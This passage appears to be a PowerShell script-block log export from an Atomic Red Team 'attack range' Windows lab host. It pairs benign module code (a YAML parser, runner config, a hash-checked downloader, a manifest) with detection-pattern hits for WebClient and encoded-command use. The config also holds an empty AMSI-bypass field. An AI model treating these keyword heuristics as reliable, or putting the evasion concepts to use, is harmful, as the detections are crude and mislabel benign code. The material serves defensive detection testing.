  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""execLogPath""
  Value       = { Join-Path $artConfig.atomicLogsPath $artConfig.logFileName }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""stopFile""
  Value       = { Join-Path $artConfig.runnerFolder ""stop.txt"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""logFile""
  Value       = { Join-Path $artConfig.atomicLogsPath ""log-$($artConfig.basehostname).txt"" }
}
Add-Member @scriptParam
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'Get' matched: 'get-'"
"12/16/2024 8:34:56 PM","35711020","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","16921","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#

enum SerializationOptions {
    None = 0
    Roundtrip = 1
    DisableAliases = 2
    EmitDefaults = 4
    JsonCompatible = 8
    DefaultToStaticType = 16
    WithIndentedSequences = 32
}
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$assemblies = Join-Path $here ""Load-Assemblies.ps1""
$infinityRegex = [regex]::new('^[-+]?(\.inf|\.Inf|\.INF)$', ""Compiled, CultureInvariant"");

if (Test-Path $assemblies) {
    . $here\Load-Assemblies.ps1
}

function Get-YamlDocuments {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [string]$Yaml,
        [switch]$UseMergingParser=$false
    )
    PROCESS {
        $stringReader = new-object System.IO.StringReader($Yaml)
        $parser = New-Object ""YamlDotNet.Core.Parser"" $stringReader
        if($UseMergingParser) {
            $parser = New-Object ""YamlDotNet.Core.MergingParser"" $parser
        }

        $yamlStream = New-Object ""YamlDotNet.RepresentationModel.YamlStream""
        $yamlStream.Load([YamlDotNet.Core.IParser] $parser)

        $stringReader.Close()

        return $yamlStream
    }
}

function Convert-ValueToProperType {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [System.Object]$Node
    )
    PROCESS {
        if (!($Node.Value -is [string])) {
            return $Node
        }
        
        if ([string]::IsNullOrEmpty($Node.Tag) -eq $false) {
            switch($Node.Tag) {
                ""tag:yaml.org,2002:str"" {
                    return $Node.Value
                }
                ""tag:yaml.org,2002:null"" {
                    return $null
                }
                ""tag:yaml.org,2002:bool"" {
                    $parsedValue = $false
                    if (![boolean]::TryParse($Node.Value, [ref]$parsedValue)) {
                        Throw (""failed to parse scalar {0} as boolean"" -f $Node)
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:int"" {
                    $parsedValue = 0
                    if ($node.Value.Length -gt 2) {
                        switch ($node.Value.Substring(0, 2)) {
                            ""0o"" {
                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 8)
                            }
                            ""0x"" {
                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 16)
                            }
                            default {
                                if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                                    Throw (""failed to parse scalar {0} as long"" -f $Node)
                                }
                            }
                        }
                    } else {
                        if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                            Throw (""failed to parse scalar {0} as long"" -f $Node)
                        }
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:float"" {
                    $parsedValue = 0.0
                    if ($infinityRegex.Matches($Node.Value)) {
                        $prefix = $Node.Value.Substring(0, 1)
                        switch ($prefix) {
                            ""-"" {
                                return [double]::NegativeInfinity
                            }
                            default {
                                # Prefix is either missing or is a +
                                return [double]::PositiveInfinity
                            }
                        }
                    }
                    if (![double]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                        Throw (""failed to parse scalar {0} as double"" -f $Node)
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:timestamp"" {
                    # From the YAML spec: http://yaml.org/type/timestamp.html
                    [DateTime]$parsedValue = [DateTime]::MinValue
                    $ts = [DateTime]::SpecifyKind($Node.Value, [System.DateTimeKind]::Utc)
                    $tss = $ts.ToString(""o"")
                    if(![datetime]::TryParse($tss, $null, [System.Globalization.DateTimeStyles]::RoundtripKind, [ref] $parsedValue)) {
                        Throw (""failed to parse scalar {0} as DateTime"" -f $Node)
                    }
                    return $parsedValue
                }
            }
        }

        if ($Node.Style -eq 'Plain')
        {
            $types = @([int], [long], [double], [boolean], [decimal])
            foreach($i in $types){
                $parsedValue = New-Object -TypeName $i.FullName
                if ($i.IsAssignableFrom([boolean])){
                    $result = $i::TryParse($Node,[ref]$parsedValue) 
                } else {
                    $result = $i::TryParse($Node, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)
                }
                if( $result ) {
                    return $parsedValue
                }
            }
        }

        if ($Node.Style -eq 'Plain' -and $Node.Value -in '','~','null','Null','NULL') {
            return $null
        }

        return $Node.Value
    }
}

function Convert-YamlMappingToHashtable {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [YamlDotNet.RepresentationModel.YamlMappingNode]$Node,
        [switch] $Ordered
    )
    PROCESS {
        if ($Ordered) { $ret = [ordered]@{} } else { $ret = @{} }
        foreach($i in $Node.Children.Keys) {
            $ret[$i.Value] = Convert-YamlDocumentToPSObject $Node.Children[$i] -Ordered:$Ordered
        }
        return $ret
    }
}

function Convert-YamlSequenceToArray {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [YamlDotNet.RepresentationModel.YamlSequenceNode]$Node,
        [switch]$Ordered
    )
    PROCESS {
        $ret = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
        foreach($i in $Node.Children){
            $ret.Add((Convert-YamlDocumentToPSObject $i -Ordered:$Ordered))
        }
        return ,$ret
    }
}

function Convert-YamlDocumentToPSObject {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [System.Object]$Node, 
        [switch]$Ordered
    )
    PROCESS {
        switch($Node.GetType().FullName){
            ""YamlDotNet.RepresentationModel.YamlMappingNode""{
                return Convert-YamlMappingToHashtable $Node -Ordered:$Ordered
            }
            ""YamlDotNet.RepresentationModel.YamlSequenceNode"" {
                return Convert-YamlSequenceToArray $Node -Ordered:$Ordered
            }
            ""YamlDotNet.RepresentationModel.YamlScalarNode"" {
                return (Convert-ValueToProperType $Node)
            }
        }
    }
}

function Convert-HashtableToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [hashtable]$Data
    )
    foreach($i in $($data.Keys)) {
        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]
    }
    return $Data
}

function Convert-OrderedHashtableToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [System.Collections.Specialized.OrderedDictionary] $Data
    )
    foreach ($i in $($data.Keys)) {
        $Data[$i] = Convert-PSObjectToGenericObject $Data[$i]
    }
    return $Data
}

function Convert-ListToGenericList {
    Param(
        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]
        [array]$Data=@()
    )
    $ret = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
    for($i=0; $i -lt $Data.Count; $i++) {
        $ret.Add((Convert-PSObjectToGenericObject $Data[$i]))
    }
    return ,$ret
}

function Convert-PSCustomObjectToDictionary {
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [PSCustomObject]$Data
    )
    $ret = [System.Collections.Generic.Dictionary[string,object]](New-Object 'System.Collections.Generic.Dictionary[string,object]')
    foreach ($i in $Data.psobject.properties) {
        $ret[$i.Name] = Convert-PSObjectToGenericObject $i.Value
    }
    return $ret
}

function Convert-PSObjectToGenericObject {
    Param(
        [Parameter(Mandatory=$false,ValueFromPipeline=$true)]
        [System.Object]$Data
    )

    if ($null -eq $data) {
        return $data
    }

    $dataType = $data.GetType()
    if ($data -isnot [System.Object]) {
        return $data -as $dataType
    }

    if ($dataType.FullName -eq ""System.Management.Automation.PSCustomObject"") {
        return Convert-PSCustomObjectToDictionary $data
    } elseif (([System.Collections.Specialized.OrderedDictionary].IsAssignableFrom($dataType))){
        return Convert-OrderedHashtableToDictionary $data
    } elseif (([System.Collections.IDictionary].IsAssignableFrom($dataType))){
        return Convert-HashtableToDictionary $data
    } elseif (([System.Collections.IList].IsAssignableFrom($dataType))) {
        return Convert-ListToGenericList $data
    }
    return $data -as $dataType
}

function ConvertFrom-Yaml {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false, ValueFromPipeline=$true, Position=0)]
        [string]$Yaml,
        [switch]$AllDocuments=$false,
        [switch]$Ordered,
        [switch]$UseMergingParser=$false
    )

    BEGIN {
        $d = """"
    }
    PROCESS {
        if($Yaml -is [string]) {
            $d += $Yaml + ""`n""
        }
    }

    END {
        if($d -eq """"){
            return
        }
        $documents = Get-YamlDocuments -Yaml $d -UseMergingParser:$UseMergingParser
        if (!$documents.Count) {
            return
        }
        if($documents.Count -eq 1){
            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered
        }
        if(!$AllDocuments) {
            return Convert-YamlDocumentToPSObject $documents[0].RootNode -Ordered:$Ordered
        }
        $ret = @()
        foreach($i in $documents) {
            $ret += Convert-YamlDocumentToPSObject $i.RootNode -Ordered:$Ordered
        }
        return $ret
    }
}

$stringQuotingEmitterSource = @""
using System;
using System.Text.RegularExpressions;
using YamlDotNet;
using YamlDotNet.Core;
using YamlDotNet.Serialization;
using YamlDotNet.Serialization.EventEmitters;
public class StringQuotingEmitter: ChainedEventEmitter {
    // Patterns from https://yaml.org/spec/1.2/spec.html#id2804356
    private static Regex quotedRegex = new Regex(@`""^(\~|null|true|false|on|off|yes|no|y|n|[-+]?(\.[0-9]+|[0-9]+(\.[0-9]*)?)([eE][-+]?[0-9]+)?|[-+]?(\.inf))?$`"", RegexOptions.Compiled | RegexOptions.IgnoreCase);
    public StringQuotingEmitter(IEventEmitter next): base(next) {}

    public override void Emit(ScalarEventInfo eventInfo, IEmitter emitter) {
        var typeCode = eventInfo.Source.Value != null
        ? Type.GetTypeCode(eventInfo.Source.Type)
        : TypeCode.Empty;

        switch (typeCode) {
            case TypeCode.Char:
                if (Char.IsDigit((char)eventInfo.Source.Value)) {
                    eventInfo.Style = ScalarStyle.DoubleQuoted;
                }
                break;
            case TypeCode.String:
                var val = eventInfo.Source.Value.ToString();
                if (quotedRegex.IsMatch(val))
                {
                    eventInfo.Style = ScalarStyle.DoubleQuoted;
                } else if (val.IndexOf('\n') > -1) {
                    eventInfo.Style = ScalarStyle.Literal;
                }
                break;
        }

        base.Emit(eventInfo, emitter);
    }

    public static SerializerBuilder Add(SerializerBuilder builder) {
        return builder.WithEventEmitter(next => new StringQuotingEmitter(next));
    }
}
""@

if (!([System.Management.Automation.PSTypeName]'StringQuotingEmitter').Type) {
    $referenceList = @([YamlDotNet.Serialization.Serializer].Assembly.Location,[Text.RegularExpressions.Regex].Assembly.Location)
    if ($PSVersionTable.PSEdition -eq ""Core"") {
        $referenceList += [IO.Directory]::GetFiles([IO.Path]::Combine($PSHOME, 'ref'), 'netstandard.dll', [IO.SearchOption]::TopDirectoryOnly)
        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp -CompilerOptions ""-nowarn:1701""
    } else {
        Add-Type -TypeDefinition $stringQuotingEmitterSource -ReferencedAssemblies $referenceList -Language CSharp
    }
}

function Get-Serializer {
    Param(
        [Parameter(Mandatory=$true)][SerializationOptions]$Options
    )
    
    $builder = New-Object ""YamlDotNet.Serialization.SerializerBuilder""
    
    if ($Options.HasFlag([SerializationOptions]::Roundtrip)) {
        $builder = $builder.EnsureRoundtrip()
    }
    if ($Options.HasFlag([SerializationOptions]::DisableAliases)) {
        $builder = $builder.DisableAliases()
    }
    if ($Options.HasFlag([SerializationOptions]::EmitDefaults)) {
        $builder = $builder.EmitDefaults()
    }
    if ($Options.HasFlag([SerializationOptions]::JsonCompatible)) {
        $builder = $builder.JsonCompatible()
    }
    if ($Options.HasFlag([SerializationOptions]::DefaultToStaticType)) {
        $builder = $builder.WithTypeResolver((New-Object ""YamlDotNet.Serialization.TypeResolvers.StaticTypeResolver""))
    }
    if ($Options.HasFlag([SerializationOptions]::WithIndentedSequences)) {
        $builder = $builder.WithIndentedSequences()
    }
    $builder = [StringQuotingEmitter]::Add($builder)
    return $builder.Build()
}

function ConvertTo-Yaml {
    [CmdletBinding(DefaultParameterSetName = 'NoOptions')]
    Param(
        [Parameter(ValueFromPipeline = $true, Position=0)]
        [System.Object]$Data,

        [string]$OutFile,

        [Parameter(ParameterSetName = 'Options')]
        [SerializationOptions]$Options = [SerializationOptions]::Roundtrip,

        [Parameter(ParameterSetName = 'NoOptions')]
        [switch]$JsonCompatible,
        
        [switch]$KeepArray,

        [switch]$Force
    )
    BEGIN {
        $d = [System.Collections.Generic.List[object]](New-Object ""System.Collections.Generic.List[object]"")
    }
    PROCESS {
        if($data -is [System.Object]) {
            $d.Add($data)
        }
    }
    END {
        if ($d -eq $null -or $d.Count -eq 0) {
            return
        }
        if ($d.Count -eq 1 -and !($KeepArray)) {
            $d = $d[0]
        }
        $norm = Convert-PSObjectToGenericObject $d
        if ($OutFile) {
            $parent = Split-Path $OutFile
            if (!(Test-Path $parent)) {
                Throw ""Parent folder for specified path does not exist""
            }
            if ((Test-Path $OutFile) -and !$Force) {
                Throw ""Target file already exists. Use -Force to overwrite.""
            }
            $wrt = New-Object ""System.IO.StreamWriter"" $OutFile
        } else {
            $wrt = New-Object ""System.IO.StringWriter""
        }
    
        if ($PSCmdlet.ParameterSetName -eq 'NoOptions') {
            $Options = 0
            if ($JsonCompatible) {
                # No indent options :~(
                $Options = [SerializationOptions]::JsonCompatible
            }
        }

        try {
            $serializer = Get-Serializer $Options
            $serializer.Serialize($wrt, $norm)
        }
        catch{
            $_
        }
        finally {
            $wrt.Close()
        }
        if ($OutFile) {
            return
        } else {
            return $wrt.ToString()
        }
    }
}

New-Alias -Name cfy -Value ConvertFrom-Yaml
New-Alias -Name cty -Value ConvertTo-Yaml

Export-ModuleMember -Function ConvertFrom-Yaml,ConvertTo-Yaml -Alias cfy,cty
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:55 PM","35710848","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","5396","
$artConfig = [PSCustomObject]@{

  # [optional] These two configs are calculated programatically, you probably don't need to change them
  basehostname               = $((hostname | Select-String -Pattern ""(.*?)(-[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12})?$"").Matches.Groups[1].value)
  OS                         = $( if ($IsLinux) { ""linux"" } elseif ($IsMacOS) { ""macos"" } else { ""windows"" })

  # [optional(if using default install paths)] Paths to your Atomic Red Team ""atomics"" folder and your ""invoke-atomicredteam"" folder
  PathToInvokeFolder         = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })  ""/AtomicRedTeam/invoke-atomicredteam"" # this is the default install path so you probably don't need to change this
  PathToPublicAtomicsFolder  = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })  ""AtomicRedTeam/atomics"" # this is the default install path so you probably don't need to change this
  PathToPrivateAtomicsFolder = Join-Path $( if ($IsLinux -or $IsMacOS) { ""~"" } else { ""C:"" })   ""PrivateAtomics/atomics"" # if you aren't providing your own private atomics that are custom written by you, just leave this as is

  # [ Optional ] The user that will be running each atomic test
  user                       = $( if ($IsLinux -or $IsMacOS) { $env:USER } else { ""$env:USERDOMAIN\$env:USERNAME"" }) # example ""corp\atomicrunner""

  # [optional] the path where you want the folder created that houses the logs and the runner schedule. Defaults to users home directory
  basePath                   = $( if (!$IsLinux -and !$IsMacOS) { $env:USERPROFILE } else { $env:HOME }) # example ""C:\Users\atomicrunner""

  # [optional]
  scheduleTimeSpan           = New-TimeSpan -Days 7 # the time in which all tests on the schedule should complete
  kickOffDelay               = New-TimeSpan -Minutes 0 # an additional delay before Invoke-KickoffAtomicRunner calls Invoke-AtomicRunner
  scheduleFileName           = ""AtomicRunnerSchedule.csv""

  # [optional] Logging Module, uses Syslog-ExecutionLogger if left blank and the syslogServer and syslogPort are set, otherwise it uses the Default-ExecutionLogger
  LoggingModule              = ''

  # [optional] Syslog configuration, default execution logs will be sent to this server:port
  syslogServer               = '' # set to empty string '' if you don't want to log atomic execution details to a syslog server (don't includle http(s):\\)
  syslogPort                 = 514
  syslogProtocol             = 'UDP' # options are UDP, TCP, TCPwithTLS

  verbose                    = $true; # set to true for more log output

  # [optional] logfile filename configs
  logFolder                  = ""AtomicRunner-Logs""
  timeLocal                  = (Get-Date(get-date) -uformat ""%Y-%m-%d"").ToString()
  logFileName                = ""$($artConfig.timeLocal)`_$($artConfig.basehostname)-ExecLog.csv""

  # amsi bypass script block (applies to Windows only)
  absb                       = $null

  # AtomicRunnerService install directory
  ServiceInstallDir                 = ""${ENV:windir}\System32""

}

# If you create a file called privateConfig.ps1 in the same directory as you installed Invoke-AtomicRedTeam you can overwrite any of these settings with your custom values
$root = Split-Path (Split-Path $PSScriptRoot -Parent) -Parent
$pathToPrivateConfig = Join-Path $root ""privateConfig.ps1""
if (Test-Path ($pathToPrivateConfig)) {
  if ($IsLinux -or $IsMacOS) {
    chmod +x $pathToPrivateConfig
  }
  & ($pathToPrivateConfig)
}

#####################################################################################
# All of the configs below are calculated using the script block in the ""Value"" field.
# This way, when you change the 'basePath' everything else is updated.
# You should probably leave all of the stuff below alone.
#####################################################################################

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""runnerFolder""
  Value       = { Join-Path $artConfig.basePath ""AtomicRunner"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""atomicLogsPath""
  Value       = { Join-Path $artConfig.basePath $artConfig.logFolder }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""scheduleFile""
  Value       = { Join-Path $artConfig.runnerFolder  $artConfig.scheduleFileName }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""credFile""
  Value       = { Join-Path $artConfig.runnerFolder ""psc_$($artConfig.basehostname).txt"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""execLogPath""
  Value       = { Join-Path $artConfig.atomicLogsPath $artConfig.logFileName }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""stopFile""
  Value       = { Join-Path $artConfig.runnerFolder ""stop.txt"" }
}
Add-Member @scriptParam

$scriptParam = @{
  MemberType  = ""ScriptProperty""
  InputObject = $artConfig
  Name        = ""logFile""
  Value       = { Join-Path $artConfig.atomicLogsPath ""log-$($artConfig.basehostname).txt"" }
}
Add-Member @scriptParam
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'Get' matched: 'get-'"
"12/16/2024 8:34:57 PM","35711088","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","1039","function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {
    $success = $false
    $null = @(
        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null
        $ms = New-Object IO.MemoryStream
        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)
        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        $actualHash = (Get-FileHash -InputStream $ms).Hash
        if ( $hash -eq $actualHash) {
            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)
            $ms.CopyTo($fileStream);
            $fileStream.Close()
            $success = $true
        }
        else {
            Write-Host -ForegroundColor red ""File hash mismatch, expected: $hash, actual: $actualHash""
        }
    )
    $success
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710570","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","1039","function Invoke-WebRequestVerifyHash ($url, $outfile, $hash) {
    $success = $false
    $null = @(
        New-Item -ItemType Directory (Split-Path $outfile) -Force | Out-Null
        $ms = New-Object IO.MemoryStream
        [Net.ServicePointManager]::SecurityProtocol = ([Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12)
        (New-Object System.Net.WebClient).OpenRead($url).copyto($ms)
        $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
        $actualHash = (Get-FileHash -InputStream $ms).Hash
        if ( $hash -eq $actualHash) {
            $ms.seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
            $fileStream = New-Object IO.FileStream $outfile, ([System.IO.FileMode]::Create)
            $ms.CopyTo($fileStream);
            $fileStream.Close()
            $success = $true
        }
        else {
            Write-Host -ForegroundColor red ""File hash mismatch, expected: $hash, actual: $actualHash""
        }
    )
    $success
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:53 PM","35710484","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","3535","@{

    # Script module or binary module file associated with this manifest.
    RootModule        = 'Invoke-AtomicRedTeam.psm1'

    # Version number of this module.
    ModuleVersion     = '2.1.0'

    # ID used to uniquely identify this module
    GUID              = '8f492621-18f8-432e-9532-b1d54d3e90bd'

    # Author of this module
    Author            = 'Casey Smith @subTee, Josh Rickard @MSAdministrator, Carrie Roberts @OrOneEqualsOne, Matt Graeber @mattifestation'

    # Company or vendor of this module
    CompanyName       = 'Red Canary, Inc.'

    # Copyright statement for this module
    Copyright         = '(c) 2021 Red Canary. All rights reserved.'

    # Description of the functionality provided by this module
    Description       = 'A PowerShell module that runs Atomic Red Team tests from yaml definition files.'

    # Minimum version of the Windows PowerShell engine required by this module
    PowerShellVersion = '5.0'

    # Modules that must be imported into the global environment prior to importing this module
    RequiredModules   = @('powershell-yaml')

    # Script files (.ps1) that are run in the caller's environment prior to importing this module.
    # AtomicClassSchema.ps1 needs to be present in the caller's scope in order for the built-in classes to surface properly.
    ScriptsToProcess  = @('Private\AtomicClassSchema.ps1', 'Public\config.ps1')

    # Functions to export from this module, for best performance, do not use wildcards and do not delete the entry, use an empty array if there are no functions to export.
    FunctionsToExport = @(
        'Invoke-AtomicTest',
        'Get-AtomicTechnique',
        'New-AtomicTechnique',
        'New-AtomicTest',
        'New-AtomicTestInputArgument',
        'New-AtomicTestDependency',
        'Start-AtomicGUI',
        'Stop-AtomicGUI',
        'Invoke-SetupAtomicRunner',
        'Invoke-GenerateNewSchedule',
        'Invoke-RefreshExistingSchedule',
        'Invoke-AtomicRunner',
        'Get-Schedule',
        'Invoke-KickoffAtomicRunner',
        'Get-PreferredIPAddress',
        'Invoke-KillProcessTree'
    )

    # Variables to export from this module
    VariablesToExport = '*'

    NestedModules     = @(
        ""Public\Default-ExecutionLogger.psm1"",
        ""Public\Attire-ExecutionLogger.psm1"",
        ""Public\Syslog-ExecutionLogger.psm1"",
        ""Public\WinEvent-ExecutionLogger.psm1""
    )

    # Private data to pass to the module specified in RootModule/ModuleToProcess. This may also contain a PSData hashtable with additional module metadata used by PowerShell.
    PrivateData       = @{

        PSData = @{

            # Tags applied to this module. These help with module discovery in online galleries.
            Tags         = @('Security', 'Defense')

            # A URL to the license for this module.
            LicenseUri   = 'https://github.com/redcanaryco/invoke-atomicredteam/blob/master/LICENSE.txt'

            # A URL to the main website for this project.
            ProjectUri   = 'https://github.com/redcanaryco/invoke-atomicredteam'

            # A URL to an icon representing this module.
            # IconUri = ''

            # ReleaseNotes of this module
            ReleaseNotes = @'
1.0.2
-----
* Add support for custom execution loggers

1.0.1
-----
* Adding 'powershell-yaml' to RequiredModules in the module manifest

1.0.0
-----
* Initial release for submission to the PowerShell Gallery
'@

        } # End of PSData hashtable

    } # End of PrivateData hashtable
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'WebClient' matched: 'http'
Pattern 'WebClient' matched: 'http'"
"12/16/2024 8:34:57 PM","35711061","6",", EncodedCommand, SuspiciousCmdlet, Get","EncodedCommand [Score: 4]; SuspiciousCmdlet [Score: 1]; Get [Score: 1]","431","function Get-PreferredIPAddress($isWindows) {
    if ($isWindows) {
        return (Get-NetIPAddress | Where-Object { $_.PrefixOrigin -ne ""WellKnown"" }).IPAddress
    }
    elseif ($IsMacOS) {
        return /sbin/ifconfig -l | /usr/bin/xargs -n1 /usr/sbin/ipconfig getifaddr
    }
    elseif ($IsLinux) {
        return ip -4 -br addr show | sed -n -e 's/^.*UP\s* //p' | cut -d ""/"" -f 1
    }
    else {
        return ''
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'EncodedCommand' matched: '-e ''
Pattern 'SuspiciousCmdlet' matched: 'Get-NetIPAddress'"
"12/16/2024 8:34:54 PM","35710503","6",", WebClient, Get","WebClient [Score: 5]; Get [Score: 1]","16921","# Copyright 2016 Cloudbase Solutions Srl
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#

enum SerializationOptions {
    None = 0
    Roundtrip = 1
    DisableAliases = 2
    EmitDefaults = 4
    JsonCompatible = 8
    DefaultToStaticType = 16
    WithIndentedSequences = 32
}
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$assemblies = Join-Path $here ""Load-Assemblies.ps1""
$infinityRegex = [regex]::new('^[-+]?(\.inf|\.Inf|\.INF)$', ""Compiled, CultureInvariant"");

if (Test-Path $assemblies) {
    . $here\Load-Assemblies.ps1
}

function Get-YamlDocuments {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [string]$Yaml,
        [switch]$UseMergingParser=$false
    )
    PROCESS {
        $stringReader = new-object System.IO.StringReader($Yaml)
        $parser = New-Object ""YamlDotNet.Core.Parser"" $stringReader
        if($UseMergingParser) {
            $parser = New-Object ""YamlDotNet.Core.MergingParser"" $parser
        }

        $yamlStream = New-Object ""YamlDotNet.RepresentationModel.YamlStream""
        $yamlStream.Load([YamlDotNet.Core.IParser] $parser)

        $stringReader.Close()

        return $yamlStream
    }
}

function Convert-ValueToProperType {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true)]
        [System.Object]$Node
    )
    PROCESS {
        if (!($Node.Value -is [string])) {
            return $Node
        }
        
        if ([string]::IsNullOrEmpty($Node.Tag) -eq $false) {
            switch($Node.Tag) {
                ""tag:yaml.org,2002:str"" {
                    return $Node.Value
                }
                ""tag:yaml.org,2002:null"" {
                    return $null
                }
                ""tag:yaml.org,2002:bool"" {
                    $parsedValue = $false
                    if (![boolean]::TryParse($Node.Value, [ref]$parsedValue)) {
                        Throw (""failed to parse scalar {0} as boolean"" -f $Node)
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:int"" {
                    $parsedValue = 0
                    if ($node.Value.Length -gt 2) {
                        switch ($node.Value.Substring(0, 2)) {
                            ""0o"" {
                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 8)
                            }
                            ""0x"" {
                                $parsedValue = [Convert]::ToInt64($Node.Value.Substring(2), 16)
                            }
                            default {
                                if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                                    Throw (""failed to parse scalar {0} as long"" -f $Node)
                                }
                            }
                        }
                    } else {
                        if (![long]::TryParse($Node.Value, [Globalization.NumberStyles]::Any, [Globalization.CultureInfo]::InvariantCulture, [ref]$parsedValue)) {
                            Throw (""failed to parse scalar {0} as long"" -f $Node)
                        }
                    }
                    return $parsedValue
                }
                ""tag:yaml.org,2002:float"" {
                    $parsedValue = 0.0
                    if ($infinityRegex.Matches($Node.Value)) {
                        $prefix = $Node.Value.Substring(0, 1)
                        switch ($prefix) {
                            ""-"" {
                                return [double]::NegativeInfinity
                            }
                            default {
